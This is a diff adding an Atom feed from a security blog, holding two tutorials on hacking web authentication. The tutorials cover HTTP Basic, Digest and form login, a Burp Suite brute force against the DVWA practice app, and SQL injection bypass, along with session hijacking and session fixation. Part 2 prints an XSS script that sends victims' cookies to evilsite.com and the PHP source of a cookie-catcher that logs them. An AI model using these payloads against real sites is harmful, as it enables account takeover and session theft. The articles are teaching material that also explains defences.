@@ -1,0 +1,446 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+
+  <title><![CDATA[Category: authentication | Prateek Gianchandani]]></title>
+  <link href="http://prateek147.github.io//categories/authentication/atom.xml" rel="self"/>
+  <link href="http://prateek147.github.io/"/>
+  <updated>2016-06-07T09:12:32+04:00</updated>
+  <id>http://prateek147.github.io/</id>
+  <author>
+    <name><![CDATA[Prateek Gianchandani]]></name>
+    
+  </author>
+  <generator uri="http://octopress.org/">Octopress</generator>
+
+  
+  <entry>
+    <title type="html"><![CDATA[Hacking Web Authentication – Part 2]]></title>
+    <link href="http://prateek147.github.io/2013/06/12/hacking-web-authentication-part-2"/>
+    <updated>2013-06-12T05:03:00+04:00</updated>
+    <id>http://prateek147.github.io/2013/06/12/hacking-web-authentication-part-2</id>
+    <content type="html"><![CDATA[<p><a href="http://highaltitudehacks.com/blog/2013/06/12/hacking-web-authentication-part-1/">In the first part of this article</a> we looked at some of the common authentication types used in Web Applications these days and discussed their pros and cons. In this article we take it one step further and discuss some of the advanced authentication methods used these days. We will also discuss the various techniques for bypassing web based authentication, and discuss the steps needed to avoid such kinds of vulnerabilities. <!-- more --> Overall this article will be divided into two sections.</p>
+
+
+
+
+<h2>A) Bypassing Authentication</h2>
+
+
+<ol>
+    <li>SQL Injection</li>  
+    <li>Cookie Stealing</li>
+    <li>Session Hijacking</li>
+</ol>
+
+
+
+
+<h2>B) Advanced Authentication Methods</h2>
+
+
+<ol>
+    <li>Certificate Based Authentication</li>
+    <li>Two-Factor Authentication</li>
+    <li>Open ID</li>
+</ol>
+
+
+
+
+<h2>Bypassing Authentication</h2>
+
+
+
+
+<p>Bypassing authentication is one of the most useful techniques as it does not require us to know the user's credentials in order to access the user's profile. This technique however does not work with HTML-Basic authentication type because, as we remember from the first part of this article, HTML-Basic requires us to send the username and password with every request.</p>
+
+
+
+
+<p><b>a) SQL Injection</b>- This technique is valid in cases when the user's credentials are processed at the backend in an SQL statement. If the user's input is not validated properly, then the attacker has the capability to inject the SQL statement with malicious queries which will allow him to bypass the authentication.</p>
+
+
+
+
+<p>Let's say the SQL statement which is responsible for validating the input sent by the user looks something like this. The <i>Username</i> and <i>Password</i> are the values of the username and password passed by the user which is then sent to this SQL Statement without input validation.</p>
+
+
+
+
+<pre>SELECT * FROM USER_TABLE WHERE USERNAME = 'Username' and PASSWORD = 'Password';</pre>
+
+
+
+
+<p>Let's say the user enters the username as <i> admin' OR 1=1 --</i> and the password as <i>blah</i>.</p>
+
+
+
+
+<p>The SQL query will look like this now.</p>
+
+
+
+
+<pre>SELECT * FROM USER_TABLE WHERE USERNAME = 'admin' OR 1=1 --' and PASSWORD = 'blah';</pre>
+
+
+
+
+<p>If we look closely at the SQL statement, the statement will only get executed till the following line as all the other characters are commented out because of the dashes "--".</p>
+
+
+
+
+<pre>SELECT * FROM USER_TABLE WHERE USERNAME = 'admin' OR 1=1 --</pre>
+
+
+
+
+<p>Hence the SQL statement selects the user admin if a user with the username "admin" is available in its database otherwise it just returns the first user in the database because the BOOL value of the statement evaluates to TRUE. Hence there was no use of any password in this case. Input validation must be done in order to protect from SQL Injection. Note that SQL Injection in itself is a very massive topic and the case discussed in this article in one of the most simplest forms of SQL Injection. Also note that it is not necessary that the credentials are always validated in the backend with a SQL statement, in which case SQL Injection will not work.</p>
+
+
+
+
+<p><b>b) Cookie Stealing</b>-Cookies are another source of valuable information that is stored on the user's computer. Cookies can include valuable information about the user, which could be the user/pass in encoded or encrypted format, the session ID value etc. As far as web authentication is concerned, cookies can be a valuable resource in maintaining the state between the user and the website. A good example of this is a web application which sets a cookie on the user's system once the user logs in successfully. For all the subsequent requests the user doesn't have to send his credentials now as long as the cookie doesn't expire. However this could be a security issue. The problem is that in an open unencrypted network, it is very easy to capture the cookie's of various users using packet sniffing tools like Wireshark etc. Once the attacker has the cookie, he can use that cookie to impersonate the user. To protect the victim from getting compromised because of these risks, there are different flags that can be set on the server side for issuing cookies to the user.</p>
+
+
+
+
+<p><b class="small">Secure Flag</b>- This flag ensures that the cookie is never transmitted over an unencrypted channel and should always be passed from the client to the server over a secure channel (HTTPS). This flag is very useful as it protects the victim from eavesdropping attacks.</p>
+
+
+
+
+<p><b class="small">Http-Only Flag</b>- This feature ensures that the Cookie is not accessible from any non-Http Api's. This prevents the victim from cookie stealing attacks where the attacker can use javascript to directly access the sessions cookies. Note that this method is not completely foolproof but provides a decent level of security and hence should be used whenever needed.</p>
+
+
+
+
+<p>Note that not all the values in a cookie are related to maintaining the user's session with the website. Some of them could just be used to monitor the user's activities or for some other reasons. Let's do a quick dissection of the cookies set on our system while using Facebook. I will be using the Firefox Add-on <i>Cookie Manager</i> to view the cookies set by Facebook. It is a very handy add-on for monitoring and changing cookies.</p>
+
+
+<p><img src="http://prateek147.github.io/images/posts/webauth2//Screen Shot 2012-01-15 at 5.58.25 PM.png" width="1439" height="417" alt="Screen Shot 2012 01 15 At 5.58.25 PM"></p>
+
+<p>As we can see there are a number of name-value pairs in the cookies stored by facebook on our system. Also, not all of them are related to the user's session. In my case i modified the cookie value with the name "s" and found out that i was still able to browse through facebook, hence the session was still maintained. But when i modified the cookie value with the name "c_user", and tried to surf pages across facebook i found out that i was logged out, i.e the session state was broken and i had to reenter my credentials.</p>
+
+
+
+
+<p>There could be a number of ways for stealing cookies. In this case i will be discussing the technique of stealing cookies by exploiting an XSS vulnerability in the application. As we know that XSS allows us to execute a script on the victim's browser. Let's say we execute the following script on the victim machine.</p>
+
+
+
+
+<xmp><script>document.location='http://evilsite.com?cookie=<script>document.cookie</script>'</script></xmp>
+
+
+
+
+<p>What we are doing is accessing the user's cookie via javascript and passing it to an external website which stores the cookies of the user. Note that in order to access the cookie via Javascript, the HTTP-Only flag should not be set in the Cookie. Once the attacker has the user's cookies, he can enter the cookie values in his own browser by using tools like "Cookie Manager" etc and hence impersonate the user. Note that this method will work only if the website uses cookies for maintaining the session state between the client and the browser. On the evil site, we could have some php code that will receive the cookie and store it in a file. </p>
+
+
+
+
+<p>Here is what the code for the Cookie Catcher file looks like.</p>
+
+
+<p>```</p>
+
+<pre><code>&lt;?php
+$cookie = $_GET['c'];
+$ip = getenv ('REMOTE_ADDR');
+$date=date("j F, Y, g:i a");;
+$referer=getenv ('HTTP_REFERER');
+$fp = fopen('user_info.html', 'a');
+fwrite($fp, 'Cookie: '.$cookie.'&lt;br&gt; IP: ' .$ip. '&lt;br&gt; Date and Time: ' .$date. '&lt;br&gt; Referer: '.$referer.'&lt;br&gt;&lt;br&gt;&lt;br&gt;');
+fclose($fp);
+//Redirect the user to google.com
+header ("Location: http://www.google.com");
+?&gt;
+</code></pre>
+
+<p>```</p>
+
+<p>This type of attack can be prevented by using appropriate flags (Secure and HTTP-only) for cookies whenever needed. Use of encoding should be avoided in cookies as it is trivial to decode the cookies to get back the original value. Instead encryption should be used in cookies which will prevent it from eavesdropping attacks even in an open and unencrypted network.</p>
+
+
+
+
+<p><b>c) Session Hijacking</b>- In many cases a user who has authenticated successfully to a website is provided with a token value, or a session ID. This ID is used by the user while making subsequent requests to the website. In case the attacker is able to get the session ID, it is possible to impersonate the client depending on the security mechanisms deployed by the website. There are many ways of obtaining this session ID, sometimes the session ID is stored in the cookie and hence could be obtained by using the Cookie Stealing attacks as discussed earlier. In some cases, the session ID is passed as a query parameter, i.e in the URL. If an attacker has control of any proxy in between the client and the website, it is very easy for him to access the url from the logs and thus get the Session ID. In case the range of the Session ID's is known, it is also possible to brute force the session ID using Burpsuite as we did in part 1 of this article, the only difference now being that the parameter we are changing is the session ID.</p>
+
+
+
+
+<p> The following screenshot shows the session ID passed in a request to the application DVWA. Using Burpsuite it is possible to brute force with the session ID as the changing parameter. To learn more on how to brute force using Burp, refer to the <a href="http://resources.infosecinstitute.com/authentication-hacking-pt1/">Part 1</a> of this article.</p>
+
+
+<p><img src="http://prateek147.github.io/images/posts/webauth2//Screen shot 2012-01-16 at 1.17.54 PM.png" width="800" height="574" alt="Screen Shot 2012 01 16 At 1.17.54 PM"></p>
+
+<p>There are various ways in which the attacker can steal the session of the victim. One of these methods is called a Session Fixation attack. In this attack, the attacker can control the session ID which a user will obtain once the user logs in to a particular website. He can do this by making the user click on a link with a specific session id, for e.g the url could be site.com?session_id=3ejn324n23j423n3 . Once the user logs in, he is given the session id "3ejn324n23j423n3". The attacker can now simply impersonate the victim by using the same Session ID. Note that this method will only work in cases when only the Session ID parameter is used to authenticate the victim. If some other parameter like the Ip-address, Mac address etc is used to validate the victim too, this method will not work. </p>
+
+
+
+
+<p>These kind of attacks can be prevented by using session ID's that are long, complex and are not easily predicatable. Also the session ID's should have a very large keyspace, which will make brute force attacks less likely to be successful.</p>
+
+
+
+
+<h2>Advanced Authentication Methods</h2>
+
+
+<p> With the increase in security awareness among people over the last few years, a number of new authentication methods have been deployed. In this section, we will be discussing some of the most popular ones.</p>
+
+
+
+
+<p><b class="small">a) Two-Factor Authentication</b>-A Two factor authentication involves the use of 2 different kinds of evidence to authenticate a person. Please note that these 2 different kinds of evidence should be completely independent of each other. These 2 factors can be defined in terms of <i> "Something you have"</i> and <i>"Something you know"</i>. An example of a two-factor authentication is a biometric authentication asking the users to provide their fingerprint and then asking them to enter their password. In this case the password goes under the category "Something you know" whereas the fingerprint goes under the category "Something you have". In some cases, hardware tokens are provided to the user as a second factor for authentication.However implementation and support for hardware tokens are very costly, and hence most banking companies do not support this. It would be better to atleast give the user an option to choose whether he wants to use two-factor authentication or not and then charge the amount from him in case he wants it.</p>
+
+
+
+
+<p>However there are other methods for providing two-factor authentication which are not that expensive. Use of One Time passwords is one such example. Some of the service providers ask the user to enter a One Time Password (OTP) each time the user logs in to use their service. This One Time Password is sent either via a text message or a voice call to their mobile phones. Hence the role of hardware tokens is now taken up by the user's mobile phone.Two-Factor Authentication is still vulnerable to Man in the Middle attacks, where an attacker can set up a malicious website and once the user enters his credentials, a request is made to the actual website via the attacker. If properly executed, the user will never know that he is not at the original site.</p>
+
+
+<p></p>
+
+<p><b class="small">b) Certificate Based Authentication</b>-Certificate Based Authentication is one of the most popular authentication methods used these days. It involves the use of a digital certificate to authenticate a user. Users are prompted to install a unique certificate on their system the first time the user uses a service. So when the user browses to that service again, the service will query the user PC for that unique certificate. If the certificate is valid, then the service will grant access to the user. In some cases, certificate based authentication is used with regular password based authentication method to provide a two-factor authentication which adds an extra layer of security. This is because the certificate is something that the user should have and the password is something that the user should know.</p>
+
+
+
+
+<p><b class="small">c) Open ID</b>- During the last few years, many websites have started delegating the responsibility of authentication to external authentication service providers. An example of this is the Windows Live ID which allows a user to sign onto multiple websites with the same account. However the most popular authentication service provider is Open ID. Once a user has an Open ID account, he can log on to all the websites that supports Open ID authentication using only one username/password combination.Open ID is supported by many popular websites like Google, Yahoo, Facebook, AOL etc. To create an Open ID we must register an account with an Open ID provider. Some of the popular Open ID providers are MyOpenId, Yahoo etc. It is an important to choose a good Open ID provider as they will be the ones managing our credentials.</p>
+
+
+
+
+<p>One thing to note that here is that only the Open ID provider can see our password and that the Open ID provider is responsible for communicating with the website and asking it to identify us as a valid user. Some security concerns have been raised in the past over the security that Open ID provides. The problem is, if your Open ID username/password is compromised by an attacker, then it can reveal your whole online information. The attacker can then log on to all the websites that you use with your Open ID. Hence the convenience caused by Open ID does come at a cost. More information about Open ID can be found <a href="http://openid.net/">here</a>.</p>
+
+
+
+
+<h2>Conclusion</h2>
+
+
+
+
+<p>In this article we looked at some of the advanced authentication techniques used these days, namely Two-Factor Authentication, Certificate Based Authentication and Open ID. We discussed the pros and cons of each of these techniques. We also discussed various methods of Bypassing authentication like SQL Injection, Cookie Stealing and Session Hijacking. No one method of authentication is the best, however using some of the advanced authentication methods will always decrease the chances of our personal information getting compromised.</p>
+
+
+
+
+<h2>References</h2>
+
+
+
+
+<ol>
+    <li><p>OpenID Foundation Website</br><a href="http://openid.net">http://openid.net</a></p></li>
+    <li><p>Two-Factor Authentication</br><a href="http://en.wikipedia.org/wiki/Two-factor_authentication">http://http://en.wikipedia.org/wiki/Two-factor_authentication</a></p></li>
+    <li><p>Session Hijacking attack</br><a href="https://www.owasp.org/index.php/Session_hijacking_attack">https://www.owasp.org/index.php/Session_hijacking_attack</a></p></li>
+    <li><p>HTTP Cookie</br><a href="http://en.wikipedia.org/wiki/HTTP_cookie">http://en.wikipedia.org/wiki/HTTP_cookie</a></p></li>
+    <li><p>Public Key Certificate</br><a href="http://en.wikipedia.org/wiki/Public_key_certificate">http://en.wikipedia.org/wiki/Public_key_certificate</a></p></li>
+    <li><p>Advanced sign-in security for your google account</br><a href="http://googleblog.blogspot.com/2011/02/advanced-sign-in-security-for-your.html">http://googleblog.blogspot.com/2011/02/advanced-sign-in-security-for-your.html</a></p></li>
+</ol>
+
+
+
+
+<p>This article was originally published on the <a href="http://resources.infosecinstitute.com/">resources</a> page at <a href="http://infosecinstitute.com/">Infosec Institute</a>. For more information, please visit my author <a href="http://resources.infosecinstitute.com/author/prateek/">page</a>.</p>
+
+
+
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[Hacking Web Authentication – Part 1]]></title>
+    <link href="http://prateek147.github.io/2013/06/12/hacking-web-authentication-part-1"/>
+    <updated>2013-06-12T04:57:00+04:00</updated>
+    <id>http://prateek147.github.io/2013/06/12/hacking-web-authentication-part-1</id>
+    <content type="html"><![CDATA[<p>Authentication is the process of validating something as authentic. When a client makes a request to a web server for accessing a resource, sometimes the web server has to verify the user's identity. For that the user will have to supply some credentials and the web server validates it. All subsequent decisions are then taken on the basis of the credentials supplied by the client. This process is called Authentication. Once the user is authenticated, the web server sets up the appropriate permissions for the user on it's resources. Whenever the user tries to access a resource, the server will check if the user has appropriate permissions to access the resource or not. This process is called Authorization.In this article we will look at some of the common types of authentication used these days, discuss the vulnerabilities in them, and then move on to some attacks against these authentication types.</p>
+
+
+
+
+<!-- more -->
+
+
+
+
+<p>Please note that we will be using Burpsuite in this article for analyzing the requests sent through. Burpsuite is available by default in Backtrack. In order to intercept the requests and manipulate them, we must configure our browser to use Burp's proxy, which is 127.0.0.1:8080 by default. We will also be using Wireshark a bit.</p>
+
+
+<p><img src="http://prateek147.github.io/images/posts/webauth1//1.png" width="617" height="562" alt="1"></p>
+
+<p>Once this is done, open up Burpsuite, go to Proxy-->Intercept and make sure Intercept is on.</p>
+
+
+<p><img src="http://prateek147.github.io/images/posts/webauth1//2.png" width="1137" height="224" alt="2">
+˜</p>
+
+<p>Now go to the options tab and check to see if the proxy is listening on port 8080. Also make sure "Generate CA-signed per-host certificates" option is checked. Each time the user connects to a SSL protected website, Burpsuite will generate a server certificate for that host, signed by a unique CA certificate which is generated in Burpsuite during it's installation. The purpose of this is to reduce the SSL errors that occur because of the proxy in between.</p>
+
+
+<p><img src="http://prateek147.github.io/images/posts/webauth1//3.png" width="1136" height="700" alt="3"></p>
+
+<p>Now that we have set up Burpsuite and the configurations in our browser properly, we can intercept requests. Please note that whenever you send a request, it will be intercepted by Burpsuite and you will have to forward it manually. Hence it is advisable to keep "intercept is on" option checked only when you really want to see the contents of the packets going through.</p>
+
+
+
+
+<h2>Types of Authentication</h2>
+
+
+
+
+<h3>1)HTTP-Basic Authentication</h3>
+
+
+
+
+<p>HTTP-Basic authentication uses a combination of a username and password to authenticate the user. The process starts when a user sends a GET request for a resource without providing any authentication credentials. The request is intercepted by Burpsuite and looks something like this.</p>
+
+
+<p><img src="http://prateek147.github.io/images/posts/webauth1//4.png" width="1141" height="243" alt="4"></p>
+
+<p>The server responds back with a "Authorization Required" message in it's header.We can see the packet in Wireshark. As we can see from the header that the authentication is of the type "Basic". The browser is quick to recognize this and displays a popup to the user requesting for a Username and a Password. Note that the popup is displayed by the browser and not the web application.</p>
+
+
+<p><img src="http://prateek147.github.io/images/posts/webauth1//5.png" width="1431" height="660" alt="5"></p>
+
+<p>Once we type in the username and password and intercept the request the request again using Burpsuite, we get something like this.The last line says "Authorization: Basic aW5mb3NlYzppbmZvc2VjaW5zdGl0dXRl". This is basically the extra thing being passed in the header now. The text after Basic holds the key. These are basically the credentials in encoded form.The username and password are concatenated with a colon (:) in between and the whole thing is then encoded using the Base64 algorithm. For example, if the username is "infosec" and the password is "infosecinstitute" then the whole thing "infosec:infosecinstitute" is encoded using the Base 64 algorithm.The server then gets the header value, decodes it to get the credentials and grants access to the user if the credentials are correct. The point to note here is that it is very trivial to decode the encoded string to obtain the credentials, hence it is widely vulnerable to eavesdropping attacks.</p>
+
+
+<p><img src="http://prateek147.github.io/images/posts/webauth1//6.png" width="1140" height="236" alt="6"></p>
+
+<p>Wireshark is able to recognize this and automatically decodes the string to reveal the credentials as shown in the figure below.</p>
+
+
+<p><img src="http://prateek147.github.io/images/posts/webauth1//7.png" width="1405" height="297" alt="7"></p>
+
+<p>As we can see from the Credentials sections, the username and password are "infosec" and "infosecinstitute" respectively. One of the problems with HTTP-Basic Authentication is that the data is being passed over in plaintext. This risk can be removed by using SSL, which will send the data in encrypted format, and hence the value in the Authorization header will not be visible. However it will be still be vulnerable to many client side attacks, including MITM. It is also vulnerable to Brute force attacks which we will see in the coming sections.</p>
+
+
+
+
+<h3>2)HTTP-Digest Authentication</h3>
+
+
+
+
+<p>Digest Authentication was designed as an improvement over Basic Authentication. One of the major improvements with it is that the data is not passed over in cleartext but in encrypted format. The user first makes a request to the Page without any credentials. The server replies back with a WWW-Authenticate header indicating that credentials are required to access the resource. The server also sends back a random value which is usually called a "nonce". The browser then uses a cryptographic function to create a message digest of the username, password, nonce, the HTTP methods, and the URL of the page. The cryptographic function used in this case is a one way function, meaning that the message digest can be created in one direction but cannot be reversed back to reveal the values that created it.By default, Digest authentication uses MD5 cryptographic hashing algorithm.</p>
+
+
+
+
+<p>Digest Access authentication is less vulnerable to Eavesdropping attacks than Basic authentication, but is still vulnerable to replay attacks, i.e if a client can replay the message digest created by the encryption, the server will allow access to the client. However to thwart this kind of attack, server nonce sometimes also contains timestamps. Once the server gets back the nonce, it checks its attributes and if the time duration is exceeded, it may reject the request from the client. One of the other good things about Digest access authentication is that the attacker will have to know all the other 4 values (username, nonce, url, http method) in order to carry out a Dictionary or a Brute force attack. This process is more computationally expensive than simple brute force attacks and also has a larger keyspace which makes brute force attack less likely to succeed.</p>
+
+
+
+
+<h3>3)Form Based Authentication</h3>
+
+
+
+
+<p>Form Based Authentication uses a form (usually in html) with input tags to allow users to enter their username and password. Once the user submits the information, it is passed over through either GET or POST methods via HTTP or HTTPs to the server. On the server side if the credentials are found to be correct, then the user is authenticated and some random token value or session id is given to the user for subsequent requests. One of the good features about Form Based authentication is that their is no standardized way of encoding or encrypting the username/password, and hence it is highly customizable which makes it immune to the common attacks which were successful against HTML Basic and Digest Authentication mechanisms. Form Based authentication is by far the most popular authentication method used in Web applications. Some of the issues with Form based authentication is that credentials are passed over in plaintext unless steps such as employment of TLS (Transport Layer Security) are not taken.</p>
+
+
+<p></p>
+
+<p>Let's see an example of Form based authentication. We will be using DVWA (Damn vulnerable web application) for our exercise as we will be using the same for carrying out a brute force attack against Form based authentication. DVWA can be downloaded from <a href="http://dvwa.co.uk/">here</a>.</p>
+
+
+
+
+<p>Once you have downloaded and installed it, login with the default credentials {admin/password} and click on the Brute Force tab on left side and click on View Source to view the source. Please note that the Security level is set to high in my case. As we can see the form accepts the username and password, validates it to remove any sort of special characters which could be used to perform SQL injection, and then sends it over to a sql query where the credentials are checked against the database to see if they are correct or not. </p>
+
+
+<p><img src="http://prateek147.github.io/images/posts/webauth1//8.png" width="1291" height="708" alt="8"></p>
+
+<p>let's input any username/password and intercept the result using Burpsuite. Here is what it should look like in your case.</p>
+
+
+<p><img src="http://prateek147.github.io/images/posts/webauth1//9.png" width="1139" height="249" alt="9"></p>
+
+<h2>Attacking Web Authentication</h2>
+
+
+
+
+<p>In this section we will be carrying out a bruteforce attack against form based authentication for Security level "High" in Dvwa. Please note that brute force attacks may not work in all cases. In some cases websites will start rejecting your requests after some specified number of unsuccessful tries. Also some websites may use CAPTCHA to validate if a human is indeed making the request or not.</p>
+
+
+
+
+<p>To carry out a brute force attack, we will be using the intruder feature in Burpsuite. Some of the things required for this attack are a list of common usernames and passwords. Go to the form and submit a request using any username/password for now, then intercept the request. Once you have the request, right click on it and click on "send to intruder"</p>
+
+
+<p><img src="http://prateek147.github.io/images/posts/webauth1//10.png" width="1136" height="604" alt="10"></p>
+
+<p>This will send the request information to the intruder. Go to the intruder tab. Now we will have to configure burpsuite to launch the brute force attack.Under the target tab, we can see that it has already set the target by looking at the request.</p>
+
+
+<p><img src="http://prateek147.github.io/images/posts/webauth1//11.png" width="1136" height="206" alt="11"></p>
+
+<p>Go to the positions tab now, here we can see the request which we had previously sent to intruder. Some of the things are highlighted in the request. This is basically a guess by Burpsuite to figure out what all things will be changing with each request in a Brute force attack. Since in this case only username and password will be changing with each request, we need to configure Burp accordingly.</p>
+
+
+<p><img src="http://prateek147.github.io/images/posts/webauth1//12.png" width="1122" height="293" alt="12"></p>
+
+<p>Click on the clear button on the right hand side. This will remove all the highlighted text, now we need to configure Burp to only set the username and password as the parameters for this attack. Highlight the username from this request (in this case "infosec") and click on Add. Similarly highlight the password from this request and click on Add. This will add the username and password as the first and second parameters. Once you are done, your output should look something like this.</p>
+
+
+<p><img src="http://prateek147.github.io/images/posts/webauth1//13.png" width="1138" height="318" alt="13"></p>
+
+<p>The next thing we need to do is set the Attack type for this attack, which is found at the top of the request we just modified. By default it is set to Sniper. However in our case we will be using the Attack type "Cluster Bomb". For more details on which attack is suitable for which scenario, please read Burp's documentation. Basically the idea of cluster bomb is to use Multiple payload sets (1 for username and 1 for the password), the attack will start by trying all the values in Payload 1 with first value in Payload 2, then by trying all the values in Payload 1 with second value in Payload 2 and so on. As we can see from the image below, our attack type is set to "Cluster Bomb".</p>
+
+
+<p><img src="http://prateek147.github.io/images/posts/webauth1//14.png" width="1124" height="135" alt="14"></p>
+
+<p>Go to the payload tab, make sure payload set 1 is selected, click on load and load the file containing a list of usernames. In my case i am using a very small file just for demonstrations purposes. Once you load the file all the usernames will be displayed as shown in the image below.</p>
+
+
+<p><img src="http://prateek147.github.io/images/posts/webauth1//15.png" width="1126" height="336" alt="15"></p>
+
+<p>Similarly select payload set 2, click on load and load the file containing a list of passwords.</p>
+
+
+<p><img src="http://prateek147.github.io/images/posts/webauth1//16.png" width="1130" height="338" alt="16"></p>
+
+<p>Go to the options tab now and make sure "store requests"  and "store response" options are set under results. Have a look at all the options and see if you need or don't need any of these options. </p>
+
+
+<p><img src="http://prateek147.github.io/images/posts/webauth1//17.png" width="1137" height="648" alt="17"></p>
+
+<p>All right we are now set to launch our attack. Click on intruder on the top left and click on "start attack". We will see a windows pop up with all the requests being made. So how do we know which request is successful. Usually a successful request will have a different response than an unsuccessful request or will have a different status response. In this case we see that the request with the username "admin" and the password "password" has a response of different length than the other responses.</p>
+
+
+<p><img src="http://prateek147.github.io/images/posts/webauth1//18.png" width="1136" height="489" alt="18"></p>
+
+<p>Let's click on the request with a different length response. If we click on the response section, we see the text "Welcome to the password protected area admin" in the response. This confirms that the username/password used in this request is the correct one.</p>
+
+
+<p><img src="http://prateek147.github.io/images/posts/webauth1//19.png" width="1144" height="675" alt="19"></p>
+
+<h2>Conclusion</h2>
+
+
+
+
+<p>In this article we discussed some of the common authentication methods used, the vulnerabilities in these authentication methods and then looked at different ways to attack them. However this is just a part of the story. In the recent years, many other authentication mechanisms have been developed, including use of "One Time passwords", "Digital Certificates" and use of external authentication service providers like Open ID. Several other attacks which have not been discussed in this article are Session Stealing, Cookie stealing, Cross Site Request Forgery and SQL Injection. We will be discussing all these in the next article.</p>
+
+
+
+
+<p>This article was originally published on the <a href="http://resources.infosecinstitute.com/">resources</a> page at <a href="http://infosecinstitute.com/">Infosec Institute</a>. For more information, please visit my author <a href="http://resources.infosecinstitute.com/author/prateek/">page</a>.</p>
+
+
+<p></body>
+</html></p>
+]]></content>
+  </entry>
+  
+</feed>
